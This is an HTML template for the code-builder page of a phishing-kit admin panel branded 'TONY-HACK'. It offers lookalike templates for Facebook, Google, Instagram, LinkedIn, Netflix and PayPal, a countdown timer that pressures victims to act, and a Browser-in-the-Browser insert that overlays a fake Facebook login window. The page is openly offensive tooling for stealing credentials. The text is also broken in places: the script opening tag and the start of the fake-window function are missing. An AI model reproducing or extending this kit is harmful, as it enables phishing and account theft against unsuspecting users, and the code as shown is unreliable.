<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TONY-HACK | Builder</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/theme/dracula.min.css">
    <style>
        .builder-container {
            display: flex;
            height: calc(100vh - 120px);
            gap: 20px;
        }
        .editor-panel {
            flex: 1;
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 12px;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }
        .preview-panel {
            flex: 1;
            background: white;
            border: 1px solid var(--border);
            border-radius: 12px;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }
        .panel-header {
            padding: 12px 16px;
            background: var(--bg-dark);
            border-bottom: 1px solid var(--border);
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .panel-header h4 {
            font-size: 14px;
            font-weight: 600;
        }
        .panel-header h4 i {
            margin-right: 8px;
            color: var(--primary);
        }
        .CodeMirror {
            flex: 1;
            height: 100%;
            font-size: 14px;
        }
        .preview-frame {
            flex: 1;
            width: 100%;
            border: none;
            background: white;
        }
        .quick-templates {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-bottom: 16px;
        }
        .quick-template-btn {
            padding: 8px 16px;
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 6px;
            color: var(--text-primary);
            cursor: pointer;
            transition: all 0.2s;
        }
        .quick-template-btn:hover {
            background: var(--primary);
            border-color: var(--primary);
        }
        .timer-config {
            display: none;
            margin-top: 16px;
            padding: 16px;
            background: var(--bg-dark);
            border-radius: 8px;
        }
        .bitb-config {
            display: none;
            margin-top: 16px;
            padding: 16px;
            background: var(--bg-dark);
            border-radius: 8px;
        }
    </style>
</head>
<body>
    <div class="sidebar">
        <div class="sidebar-header"><h2>TONY-HACK</h2></div>
        <div class="sidebar-user">
            <div class="avatar"><i class="fas fa-user-shield"></i></div>
            <div class="user-info"><h4>{{ session.get('user', 'admin') }}</h4><p>Administrateur</p></div>
        </div>
        <div class="sidebar-nav">
            <a href="/" class="nav-item"><i class="fas fa-home"></i><span>Dashboard</span></a>
            <a href="/campaigns" class="nav-item"><i class="fas fa-bullhorn"></i><span>Campagnes</span></a>
            <a href="/templates" class="nav-item"><i class="fas fa-file-code"></i><span>Templates</span></a>
            <a href="/builder" class="nav-item active"><i class="fas fa-code"></i><span>Builder</span></a>
            <a href="/logs" class="nav-item"><i class="fas fa-list"></i><span>Logs</span></a>
            <a href="/statistics" class="nav-item"><i class="fas fa-chart-bar"></i><span>Statistiques</span></a>
            <a href="/settings" class="nav-item"><i class="fas fa-cog"></i><span>Paramètres</span></a>
            <a href="/profile" class="nav-item"><i class="fas fa-user-circle"></i><span>Profil</span></a>
        </div>
        <div class="sidebar-footer">
            <a href="/logout" class="nav-item" onclick="return confirm('Déconnexion ?')"><i class="fas fa-sign-out-alt"></i><span>Déconnexion</span></a>
        </div>
    </div>
    
    <div class="main-content">
        <div class="page-header">
            <h1 class="page-title">Code <span>Builder</span></h1>
            <div class="flex items-center gap-2">
                <select id="templateType" style="width: auto; padding: 8px 16px;">
                    <option value="custom">Custom</option>
                    <option value="facebook">Facebook</option>
                    <option value="google">Google</option>
                    <option value="instagram">Instagram</option>
                    <option value="linkedin">LinkedIn</option>
                    <option value="netflix">Netflix</option>
                    <option value="paypal">PayPal</option>
                </select>
                <input type="color" id="templateColor" value="#e94560" style="width: 50px; padding: 4px;">
                <input type="text" id="templateName" placeholder="Nom du template" style="width: 200px;" value="Nouveau Template">
                <button class="btn btn-primary" onclick="saveTemplate()">
                    <i class="fas fa-save"></i> Sauvegarder
                </button>
                <button class="btn btn-secondary" onclick="downloadTemplate()">
                    <i class="fas fa-download"></i>
                </button>
            </div>
        </div>
        
        <!-- Quick Templates -->
        <div class="quick-templates">
            <button class="quick-template-btn" onclick="loadQuickTemplate('facebook')">
                <i class="fab fa-facebook"></i> Facebook
            </button>
            <button class="quick-template-btn" onclick="loadQuickTemplate('google')">
                <i class="fab fa-google"></i> Google
            </button>
            <button class="quick-template-btn" onclick="loadQuickTemplate('instagram')">
                <i class="fab fa-instagram"></i> Instagram
            </button>
            <button class="quick-template-btn" onclick="loadQuickTemplate('linkedin')">
                <i class="fab fa-linkedin"></i> LinkedIn
            </button>
            <button class="quick-template-btn" onclick="loadQuickTemplate('blank')">
                <i class="fas fa-file"></i> Page Blanche
            </button>
            <button class="quick-template-btn" onclick="toggleTimerConfig()">
                <i class="fas fa-clock"></i> Countdown Timer
            </button>
            <button class="quick-template-btn" onclick="toggleBitBConfig()">
                <i class="fas fa-window-maximize"></i> Browser-in-Browser
            </button>
        </div>
        
        <!-- Timer Configuration -->
        <div class="timer-config" id="timerConfig">
            <h4 style="margin-bottom: 16px;"><i class="fas fa-clock"></i> Configuration du Countdown Timer</h4>
            <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px;">
                <div class="form-group">
                    <label>Minutes</label>
                    <input type="number" id="timerMinutes" value="5" min="0" max="60">
                </div>
                <div class="form-group">
                    <label>Secondes</label>
                    <input type="number" id="timerSeconds" value="0" min="0" max="59">
                </div>
                <div class="form-group">
                    <label>Message d'urgence</label>
                    <input type="text" id="timerMessage" value="⚠️ Action requise avant expiration !">
                </div>
            </div>
            <button class="btn btn-primary btn-sm" onclick="insertTimer()">Insérer le Timer</button>
        </div>
        
        <!-- Browser-in-Browser Configuration -->
        <div class="bitb-config" id="bitbConfig">
            <h4 style="margin-bottom: 16px;"><i class="fas fa-window-maximize"></i> Browser-in-the-Browser</h4>
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px;">
                <div class="form-group">
                    <label>URL de la fausse fenêtre</label>
                    <input type="text" id="bitbUrl" value="https://www.facebook.com/login">
                </div>
                <div class="form-group">
                    <label>Titre de la fenêtre</label>
                    <input type="text" id="bitbTitle" value="Facebook - Connexion">
                </div>
            </div>
            <button class="btn btn-primary btn-sm" onclick="insertBitB()">Insérer Browser-in-Browser</button>
        </div>
        
        <!-- Editor and Preview -->
        <div class="builder-container">
            <div class="editor-panel">
                <div class="panel-header">
                    <h4><i class="fas fa-code"></i> Éditeur HTML/CSS/JS</h4>
                    <div>
                        <button class="btn btn-secondary btn-sm" onclick="formatCode()">
                            <i class="fas fa-align-left"></i> Formater
                        </button>
                        <button class="btn btn-secondary btn-sm" onclick="refreshPreview()">
                            <i class="fas fa-sync-alt"></i> Actualiser
                        </button>
                    </div>
                </div>
                <textarea id="codeEditor"></textarea>
            </div>
            
            <div class="preview-panel">
                <div class="panel-header">
                    <h4><i class="fas fa-eye"></i> Aperçu en direct</h4>
                    <div>
                        <select id="devicePreview" onchange="changeDevicePreview()" style="width: auto; padding: 4px 8px;">
                            <option value="100%">Desktop</option>
                            <option value="375px">Mobile (iPhone SE)</option>
                            <option value="768px">Tablette</option>
                        </select>
                    </div>
                </div>
                <iframe id="previewFrame" class="preview-frame"></iframe>
            </div>
        </div>
    </div>
    
    <div class="toast-container" id="toastContainer"></div>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/css/css.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/htmlmixed/htmlmixed.min.js"></script>

        function showToast(title, message, type = 'info') {
            const container = document.getElementById('toastContainer');
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            let icon = type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle';
            toast.innerHTML = `<i class="fas fa-${icon}"></i><div class="toast-content"><div class="toast-title">${title}</div><div class="toast-message">${message}</div></div>`;
            container.appendChild(toast);
            setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 300); }, 4000);
        }
        
        function initEditor() {
            editor = CodeMirror.fromTextArea(document.getElementById('codeEditor'), {
                mode: 'htmlmixed',
                theme: 'dracula',
                lineNumbers: true,
                lineWrapping: true,
                indentUnit: 4,
                tabSize: 4,
                autoCloseTags: true,
                autoCloseBrackets: true,
                matchBrackets: true
            });
            
            editor.setValue(defaultCode);
            refreshPreview();
            
            editor.on('change', function() {
                refreshPreview();
            });
        }
        
        function refreshPreview() {
            const code = editor.getValue();
            const frame = document.getElementById('previewFrame');
            const doc = frame.contentDocument || frame.contentWindow.document;
            doc.open();
            doc.write(code);
            doc.close();
        }
        
        function changeDevicePreview() {
            const width = document.getElementById('devicePreview').value;
            document.getElementById('previewFrame').style.maxWidth = width;
            document.getElementById('previewFrame').style.margin = width === '100%' ? '0' : '0 auto';
        }
        
        function loadQuickTemplate(type) {
            if (quickTemplates[type]) {
                editor.setValue(quickTemplates[type]);
                document.getElementById('templateType').value = type === 'blank' ? 'custom' : type;
                refreshPreview();
                showToast('Template chargé', `Template ${type} chargé avec succès`, 'success');
            }
        }
        
        function toggleTimerConfig() {
            const config = document.getElementById('timerConfig');
            config.style.display = config.style.display === 'none' ? 'block' : 'none';
        }
        
        function toggleBitBConfig() {
            const config = document.getElementById('bitbConfig');
            config.style.display = config.style.display === 'none' ? 'block' : 'none';
        }
        
        function insertTimer() {
            const minutes = document.getElementById('timerMinutes').value;
            const seconds = document.getElementById('timerSeconds').value;
            const message = document.getElementById('timerMessage').value;
            
            const timerCode = `
<div style="background: #fff3cd; border: 1px solid #ffc107; border-radius: 8px; padding: 16px; margin: 16px 0; text-align: center;">
    <p style="color: #856404; margin-bottom: 10px; font-weight: bold;">${message}</p>
    <div style="font-size: 32px; font-weight: bold; color: #dc3545;" id="countdown-timer">${minutes}:${seconds.padStart(2, '0')}</div>
</div>
<script>
(function() {
    let timeLeft = ${parseInt(minutes) * 60 + parseInt(seconds)};
    const timerEl = document.getElementById('countdown-timer');
    
    const interval = setInterval(() => {
        if (timeLeft <= 0) {
            clearInterval(interval);
            timerEl.textContent = 'EXPIRÉ !';
            timerEl.style.color = '#dc3545';
            return;
        }
        
        timeLeft--;
        const mins = Math.floor(timeLeft / 60);
        const secs = timeLeft % 60;
        timerEl.textContent = mins + ':' + secs.toString().padStart(2, '0');
        
        if (timeLeft < 60) {
            timerEl.style.color = '#dc3545';
            timerEl.style.animation = 'pulse 1s infinite';
        }
    }, 1000);
    
    const style = document.createElement('style');
    style.textContent = '@keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }';
    document.head.appendChild(style);
})();
<\/script>`;
            
            const cursor = editor.getCursor();
            editor.replaceRange(timerCode, cursor);
            refreshPreview();
            toggleTimerConfig();
            showToast('Timer inséré', 'Countdown timer ajouté au template', 'success');
        }

    <iframe src="${url}" style="width: 100%; height: 500px; border: none; border-radius: 0 0 8px 8px;"></iframe>
</div>
<div style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); z-index: 9998;"></div>`;
            
            const cursor = editor.getCursor();
            editor.replaceRange(bitbCode, cursor);
            refreshPreview();
            toggleBitBConfig();
            showToast('BiTB inséré', 'Browser-in-the-Browser ajouté', 'success');
        }
        
        function formatCode() {
            const code = editor.getValue();
            // Formatage simple
            const formatted = code.replace(/>\s+</g, '>\n<');
            editor.setValue(formatted);
            refreshPreview();
            showToast('Formaté', 'Code formaté', 'success');
        }
        
        async function saveTemplate() {
            const name = document.getElementById('templateName').value;
            const type = document.getElementById('templateType').value;
            const color = document.getElementById('templateColor').value;
            const content = editor.getValue();
            
            try {
                const response = await fetch('/api/templates', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ name, type, color, content })
                });
                
                if (response.ok) {
                    showToast('Sauvegardé', 'Template sauvegardé avec succès', 'success');
                    setTimeout(() => window.location.href = '/templates', 1500);
                }
            } catch (e) {
                showToast('Erreur', 'Impossible de sauvegarder', 'error');
            }
        }
        
        function downloadTemplate() {
            const content = editor.getValue();
            const blob = new Blob([content], {type: 'text/html'});
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'template.html';
            a.click();
            URL.revokeObjectURL(url);
        }
        
        // Raccourci Ctrl+S
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey && e.key === 's') {
                e.preventDefault();
                saveTemplate();
            }
        });
        
        document.addEventListener('DOMContentLoaded', initEditor);
    </script>
</body>
</html>
